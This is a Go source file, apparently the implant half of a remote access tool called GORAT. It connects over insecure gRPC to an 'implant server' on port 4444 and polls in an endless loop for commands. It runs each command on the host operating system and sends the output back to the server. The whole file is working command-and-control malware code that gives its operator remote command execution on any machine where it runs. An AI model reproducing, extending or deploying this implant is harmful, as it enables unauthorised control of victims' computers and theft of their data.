package main

import (
	"context"
	"fmt"
	"github.com/vpaklatzis/GORAT/grpcapi"
	"google.golang.org/grpc"
	"log"
	"os/exec"
	"strings"
	"time"
)

// the implant executes the operating system command and sends the output
// back to the server
func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient
	)

	opts = append(opts, grpc.WithInsecure())
	log.Println("Trying to reach the implant server...")
	// establishes connection back to our implant server
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil {
		log.Fatal("Implant client could not connect to the server: ", err)
	}
	log.Println("Connected successfully to the server")
	defer func(conn *grpc.ClientConn) {
		err := conn.Close()
		if err != nil {
			log.Fatal("Error occurred while closing the connection: ", err)
		}
	}(conn)
	client = grpcapi.NewImplantClient(conn)

	ctx := context.Background()
	// infinite loop. Polls the implant server repeatedly. If the response it receives is empty,
	// it pauses for three seconds and tries again
	for {
		var req = new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Fatal("Error occurred while trying to fetch the command: ", err)
		}
		if cmd.In == "" {
			time.Sleep(3 * time.Second)
			continue
		}
		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		client.SendOutput(ctx, cmd)
	}
}
